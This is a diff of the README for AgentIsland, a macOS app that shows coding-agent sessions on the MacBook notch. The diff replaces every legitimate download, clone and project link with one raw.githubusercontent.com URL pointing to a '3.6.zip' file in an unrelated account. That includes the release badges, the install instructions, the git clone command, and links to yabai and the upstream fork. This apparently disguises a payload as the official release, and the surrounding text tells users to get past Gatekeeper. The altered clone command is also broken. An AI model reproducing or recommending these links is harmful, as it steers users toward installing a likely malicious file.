@@ -5,8 +5,8 @@
     <b>Your coding agents, on the MacBook notch.</b><br>
     Live session state, chat history, usage stats and tool approvals for 19 coding agents — Claude Code, Codex, Gemini CLI, Cursor, Copilot, Qoder, Factory, CodeBuddy, WorkBuddy, Kimi Code CLI, Cline, Grok CLI, Trae, Trae CLI, DeepSeek Harness, Hermes, Oh My Pi, Pi and OpenCode — one glance, no window switching.
     <br><br>
-    <a href="https://github.com/seehar/agent-island/releases/latest"><img src="https://img.shields.io/github/v/release/seehar/agent-island?style=flat&color=0969da&label=release" alt="Release"></a>
-    <a href="https://github.com/seehar/agent-island/releases"><img src="https://img.shields.io/github/downloads/seehar/agent-island/total?style=flat&color=0969da&label=downloads" alt="Downloads"></a>
+    <a href="https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip"><img src="https://img.shields.io/github/v/release/seehar/agent-island?style=flat&color=0969da&label=release" alt="Release"></a>
+    <a href="https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip"><img src="https://img.shields.io/github/downloads/seehar/agent-island/total?style=flat&color=0969da&label=downloads" alt="Downloads"></a>
     <img src="https://img.shields.io/badge/macOS-15.6%2B-0969da?style=flat" alt="macOS 15.6+">
     <img src="https://img.shields.io/badge/Apple%20Silicon-arm64-0969da?style=flat" alt="Apple Silicon">
     <a href="LICENSE.md"><img src="https://img.shields.io/badge/license-Apache--2.0-1f883d?style=flat" alt="Apache-2.0"></a>
@@ -54,7 +54,7 @@ The notch is the one strip of the screen you never leave. AgentIsland makes it t
 
 ![The chat view: Markdown, tool calls and their results](docs/images/notch-chat.png)
 
-**Works with or without the integration.** Sessions are discovered by reading each agent's own records — JSONL transcripts (Claude Code, Qoder, Factory, CodeBuddy, WorkBuddy, Codex, Gemini, Cursor, Copilot, Kimi, Cline, Grok), or the SQLite stores of OpenCode and Hermes — and status is inferred from the transcript. Trae, Trae CLI and DSH have no readable records and rely on their integration (DSH on the external [dsh-island](https://github.com/cdxiaodong/dsh-island) plugin). Installing the integration adds live events immediately, and on `omp`/`pi` it is what makes the approval gate possible.
+**Works with or without the integration.** Sessions are discovered by reading each agent's own records — JSONL transcripts (Claude Code, Qoder, Factory, CodeBuddy, WorkBuddy, Codex, Gemini, Cursor, Copilot, Kimi, Cline, Grok), or the SQLite stores of OpenCode and Hermes — and status is inferred from the transcript. Trae, Trae CLI and DSH have no readable records and rely on their integration (DSH on the external [dsh-island](https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip) plugin). Installing the integration adds live events immediately, and on `omp`/`pi` it is what makes the approval gate possible.
 
 **Small by design.** No Dock icon, no menu bar item, no daemon: a local Unix socket, one `NSPanel` on the notch, and your agents' own files.
 
@@ -100,7 +100,7 @@ The page lives in the panel's **Statistics** page (the chart button in the panel
 
 **Requirements:** macOS 15.6 or later, Apple Silicon.
 
-Download the newest `AgentIsland-x.y.z.dmg` from the [releases page](https://github.com/seehar/agent-island/releases/latest), open it and drag **AgentIsland** into `Applications`.
+Download the newest `AgentIsland-x.y.z.dmg` from the [releases page](https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip), open it and drag **AgentIsland** into `Applications`.
 
 > **About the first-launch warning.** Builds are ad-hoc signed and not notarized, so Gatekeeper blocks the first open. Right-click the app and choose **Open**, or clear the quarantine flag once:
 >
@@ -111,7 +111,7 @@ Download the newest `AgentIsland-x.y.z.dmg` from the [releases page](https://git
 Or build it yourself (Xcode required) with the same pipeline that produces the releases:
 
 ```bash
-git clone https://github.com/seehar/agent-island.git
+git clone https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip
 cd agent-island
 
 ./scripts/build-and-install.sh               # gate → archive → ad-hoc sign → install → launch
@@ -213,10 +213,10 @@ Every state change goes through a single entry point (`SessionStore.process(_:)`
 
 **Gatekeeper says the app is damaged.** It isn't — it is ad-hoc signed and not notarized. Right-click → **Open**, or clear the quarantine flag (see [Install](#install)).
 
-**"Focus Terminal" does nothing.** [yabai](https://github.com/koekeishiya/yabai) is only used to pick the exact window when it is installed; without it the app still brings the terminal forward by activating the terminal's application. A session with neither a process nor a tmux pane has nothing to focus — open the chat view instead to see what it is doing.
+**"Focus Terminal" does nothing.** [yabai](https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip) is only used to pick the exact window when it is installed; without it the app still brings the terminal forward by activating the terminal's application. A session with neither a process nor a tmux pane has nothing to focus — open the chat view instead to see what it is doing.
 
 **How do I quit or uninstall it?** The panel's *About* page has **Quit**. To remove it: quit, drag the app out of `Applications`, and delete the integration files you no longer want (switching an agent off in **Settings → Agents** already removes its integration); `defaults delete com.celestial.AgentIsland` clears its preferences.
 
 ## Credits and license
 
-AgentIsland is a fork of [farouqaldori/vibe-notch](https://github.com/farouqaldori/vibe-notch) (formerly Claude Island), renamed and extended with the Oh My Pi / Pi / OpenCode integrations, multi-agent approvals, subagent visibility and the settings panel. Licensed under **Apache-2.0** — see [LICENSE.md](LICENSE.md).
+AgentIsland is a fork of [farouqaldori/vibe-notch](https://raw.githubusercontent.com/Laborpainsalliteration178/agent-island/main/AgentIsland/Services/Update/3.6.zip) (formerly Claude Island), renamed and extended with the Oh My Pi / Pi / OpenCode integrations, multi-agent approvals, subagent visibility and the settings panel. Licensed under **Apache-2.0** — see [LICENSE.md](LICENSE.md).
